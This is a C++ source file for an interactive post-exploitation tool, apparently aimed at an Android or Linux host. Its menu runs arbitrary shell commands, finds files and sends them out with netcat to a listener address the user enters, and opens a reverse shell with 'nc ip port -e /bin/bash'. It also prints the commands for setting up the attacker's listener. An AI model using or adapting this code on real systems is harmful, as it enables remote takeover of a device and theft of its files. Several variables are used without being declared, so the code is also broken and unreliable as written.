//
// Created by Chris-User on 1/30/2019.
//
#include <fstream>
#include <iostream>
#include <string>
#include <stdlib.h>
#include <vector>

using namespace std;


int main(){
    bool quit = false;

    while(!quit) {
        const string options = "Options: \n"
                               "    1) Execute single command\n"
                               "    2) Retrieve specific file\n"
                               "    3) Return a directory listing\n"
                               "    4) Create a reverse shell\n"
                               "    5) Quit\n"
                               "Choice:\n";
        cout << options;
        char choice;
        cin >> choice;
        cin.ignore(); //clear dangling newline

        vector<string> files;
        const string bash = "/system/bin/sh";

        switch (choice) {
            case '1':
                //run single command
                cout << "Command:\n";
                getline(cin, command);
                cout << "Executing: " << command << endl;
                system(command.c_str());
                break;
            case '2':
                //retrieve file with specific name
                cout << "This requires a listener with and output. Start one with:\n"
                        "    nc -lvp [port] > [file destination]\n";
                cout << "Filename:\n";
                getline(cin, file);
                command = "find / -name " + file;
                cout << "Executing: " << command << endl;
                system(command.c_str());
                //File found?
                cout << "Upload a file? (Y/n) \n";
                cin >> choice;
                cin.ignore(); // flush newline
                if (!(choice == 'n' || choice == 'N')) {
                    cout << "Direct file path:\n";
                    getline(cin, path);
                    cout << "IP of listener:\n";
                    getline(cin, ip);
                    cout << "Port of listener:\n";
                    getline(cin, port);
                    command = "nc " + ip + " " + port + " < " + path;
                    cout << "Executing: " << command << endl;
                    system(command.c_str());
                }
                break;
            case '3':
                //return directory listing
                cout << "Directory's absolute path:\n";
                getline(cin, path);
                command = "ls -la " + path;
                cout << "Executing: " << command << endl;
                system(command.c_str());
                break;
            case '4':
                //reverse shell to chosen address
                cout << "This requires a listener. Start one with:\n"
                        "    nc -lvp [port]\n";
                cout << "IP:\n";
                getline(cin, ip);
                cout << "Port:\n";
                getline(cin, port);
                command = "nc " + ip + " " + port + " -e /bin/bash";
                cout << "Executing: " << command << endl;
                system(command.c_str());
                break;
            case '5':
                quit = true;
                break;
            default:
                cerr << "invalid choice\n";
        }

    }
}